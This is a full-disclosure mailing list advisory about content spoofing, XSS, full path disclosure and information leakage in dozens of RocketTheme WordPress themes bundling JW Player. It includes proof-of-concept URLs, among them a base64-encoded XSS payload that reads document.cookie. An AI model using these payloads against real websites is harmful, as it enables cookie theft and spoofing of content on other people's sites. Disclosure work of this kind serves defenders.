Full path disclosure, vulnerability?

Ahahahahaha, good joke! You made my day.

Hello list!

Earlier I've wrote to the list about multiple vulnerabilities in multiple
themes for WordPress (http://seclists.org/fulldisclosure/2012/Dec/236). In
that later I've mentioned 16 themes by RocketTheme (with Rokbox):
Afterburner, Refraction, Solarsentinel, Mixxmag, Iridium, Infuse,
Perihelion, Replicant2, Affinity, Nexus, Sentinel, Mynxx Vestnikp, Mynxx,
Moxy, Terrantribune, Meridian.

I've wrote about 14 themes + 2 variations of 2 themes by these developers,
but they have 47 themes for WordPress in total. Among them only three are
free, and all other themes from RocketTheme are paid ones (it's needed to
buy subscription to the club to receive access to them). And Rokbox is
bundled with all these themes, except Grunge, which have all
earlier-mentioned vulnerabilities.

So I inform you about multiple vulnerabilities in 33 new themes for
WordPress, which are developed by RocketTheme (Rokbox's developers). These
are Content Spoofing, Cross-Site Scripting, Full path disclosure and
Information Leakage vulnerabilities.

-------------------------
Affected products:
-------------------------

In these 32 themes (in addition to previous 16) there are Cross-Site
Scripting, Content Spoofing, Full path disclosure and Information Leakage
vulnerabilities. And Grunge theme has FPD holes.

These are the next themes by RocketTheme: Voxel, Diametric, Ionosphere,
Clarion, Halcyon, Visage, Enigma, Momentum, Radiance, Camber, Reflex,
Modulus, Nebulae, Entropy, Tachyon, Mercado, Maelstrom, Syndicate, Paradox,
Hybrid, Omnicron, Zephyr, Panacea, Somaxiom, Juxta, Quantive, Crystalline,
Kinetic, Dominion, Reaction, Akiraka, Novus and Grunge.

Affected all versions of these themes for WordPress.

Since August I've informed the developers many times concerning
vulnerabilities in Rokbox and their themes with it.

Details:
----------

Content Spoofing (WASC-12):

In parameter file there can be set as video, as audio files.

Swf-file of JW Player accepts arbitrary addresses in parameters file and
image, which allows to spoof content of flash - i.e. by setting addresses of
video (audio) and/or image files from other site.

ayer.swf?file=1.flv&image=1.jpg> &image=1.jpg

Content Spoofing (WASC-12):

Swf-file of JW Player accepts arbitrary addresses in parameter config, which
allows to spoof content of flash - i.e. by setting address of config file
from other site (parameters file and image in xml-file accept arbitrary
addresses). For loading of config file from other site it needs to have
crossdomain.xml.

http://site/wordpress/wp-content/themes/rt_novus_wp/js/rokbox/jwplayer/jwpla
yer.swf?config=1.xml

1.xml

<config>
  <file>1.flv</file>
  <image>1.jpg</image>
</config>

Content Spoofing (WASC-12):

http://site/wordpress/wp-content/themes/rt_novus_wp/js/rokbox/jwplayer/jwpla
yer.swf?abouttext=Player
<http://site/wordpress/wp-content/themes/rt_novus_wp/js/rokbox/jwplayer/jwpl
ayer.swf?abouttext=Player&aboutlink=http://site> &aboutlink=http://site

XSS (WASC-08):

http://site/wordpress/wp-content/themes/rt_novus_wp/js/rokbox/jwplayer/jwpla
yer.swf?abouttext=Player
<http://site/wordpress/wp-content/themes/rt_novus_wp/js/rokbox/jwplayer/jwpl
ayer.swf?abouttext=Player&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydC

&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9
zY3JpcHQ%2B

Full path disclosure (WASC-13):

In all these themes there is FPD in index.php
(http://site/wordpress/wp-content/themes/rt_novus_wp/ and the same for other
themes), which works at default PHP settings. Also potentially there are FPD
in other php-files of these themes.

Information Leakage (WASC-13):

In some themes, similar to rt_mixxmag_wp, there can be error log with full
paths.
